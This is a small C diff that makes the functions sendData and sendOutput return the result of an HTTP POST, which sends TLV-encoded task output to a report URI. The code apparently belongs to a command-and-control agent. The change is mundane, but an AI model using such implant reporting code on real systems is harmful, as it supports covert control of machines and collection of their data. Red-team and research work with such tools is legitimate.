@@ -49,7 +49,7 @@ _authenticateCleanup:
   return success;
 }
 
-void sendData(int taskId, char* typ, char* error, int size, char * buff) {
+int sendData(int taskId, char* typ, char* error, int size, char * buff) {
   struct TLVBuild outputMessage;
   outputMessage.buf = malloc(50);
   outputMessage.allocsize = 50;
@@ -63,13 +63,13 @@ void sendData(int taskId, char* typ, char* error, int size, char * buff) {
   DWORD bytesRead;
   printf("[+] Sending %lu bytes: %.*s\n", outputMessage.bufsize, outputMessage.bufsize, outputMessage.buf);
 
-  httpPost(
+  return httpPost(
     host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
   );
 }
 
-void sendOutput(int taskId, struct TLVBuild tlv) {
-  sendData(
+int sendOutput(int taskId, struct TLVBuild tlv) {
+  return sendData(
     taskId, "output", "", tlv.bufsize, tlv.buf
   );
 }
